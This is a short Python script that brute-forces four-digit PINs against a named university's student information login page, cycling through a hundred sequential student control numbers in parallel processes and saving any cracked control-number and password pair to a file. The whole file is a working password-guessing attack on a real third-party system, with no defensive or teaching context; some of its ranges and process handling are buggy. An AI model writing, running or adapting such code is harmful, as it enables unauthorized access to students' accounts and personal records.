import multiprocessing
import requests
import os
# Define the URL of the login page
login_url = "https://sii.itq.edu.mx/sistema/index.php"

def generate_numbers(start, end, ctrl_number):
    for number in range(start, end + 1):
                formatted_number = f'{number:04}'
                #print(formatted_number)
                # Create a session to persist cookies
                session = requests.Session()

                # Prepare the data for the POST request
                data = {
                    "no_de_control": ctrl_number,  # Replace with your actual control number
                    "password": formatted_number,  # Replace with your actual password
                }

                # Send a POST request to the login page
                response = session.post(login_url, data=data)
                if "modulos/alu/" in response.text:
                    print("Login successful!")
                    print(f"{ctrl_number}:{formatted_number}")
                    with open("supremepower.txt", "w") as f:
                        f.write(f"{ctrl_number}:{formatted_number}")
                        process.terminate()
                    break
                if "no_de_control" not in response.text:
                    print("Login failed.")
                    with open("supremepower.txt", "w") as f:
                        f.write(f"{ctrl_number}: NOT FOUND")
                        process.terminate()
                    break
                session.close()

if __name__ == "__main__":
    for number in range(100):
        ranges = [(0, 4499), (9999, 4500), (4499, 0), (4500, 9999)]
        ctrl_number = 20140801 + number
        processes = []
        for start, end in ranges:
            print(f"Starting process for range {start} to {end} for {ctrl_number}")
            process = multiprocessing.Process(target=generate_numbers, args=(start, end, ctrl_number))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()
